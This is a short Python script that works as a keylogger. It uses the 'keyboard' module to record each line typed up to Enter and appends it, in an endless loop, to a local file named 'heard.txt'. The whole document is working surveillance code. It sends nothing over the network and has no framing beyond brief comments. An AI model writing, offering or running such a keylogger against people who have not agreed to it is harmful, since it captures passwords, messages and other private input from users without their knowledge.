# importing keyboard module
import keyboard as k

run = True

while run:

    # open/create 'heard.txt' file to store collected data
    with open('heard.txt', 'a') as heard:

        # record keystrokes, seperating lines by 'enter'
        listener = k.record('enter')
        # assemble keystrokes into strings
        string = list(k.get_typed_strings(listener))

        # append a newline to file before adding new data
        heard.write('\n')
        # append data to file
        heard.write(string[0])